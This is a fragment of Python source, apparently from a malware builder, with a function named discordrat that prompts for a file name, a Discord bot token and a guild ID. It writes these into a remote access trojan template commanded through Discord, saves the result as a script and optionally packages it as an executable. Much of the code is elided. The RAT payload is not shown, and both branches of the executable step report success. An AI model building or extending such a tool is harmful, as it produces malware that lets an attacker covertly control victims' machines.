...
def discordrat():
    ...
    clear()
    print(""" Enter the name you want to give to the final file: """)
    global filename
    fileName = str(input(""" File name: """))
    print(""" Enter the token of the bot you will use to execute the RAT commands: """)
    global tokenbot
    tokenbot = str(input(""" Bot token: """))
    print(""" Enter the guild ID on which the slash commands are registered: """)
    guildid = str(input(""" Guild ID: """))
    print('\n')
    spinner()
...
client.run(token)""".replace("~~TOKENHERE~~'", tokenbot + "'; g = [" + guildid + "]"))
    ...
    print(""" File has been correctly written to "output/{fileName}.py" """)
    convert = input(""" Convert your script into an executable (Y/N) ? """)
    if convert.upper() == 'Y' or convert.upper() == 'YES':
        try:
            ...
            try:
                ...
                pass
            clear()
            print(" The executable file has been correctly generated")
        except:
            clear()
            print(" The executable file has been correctly generated")
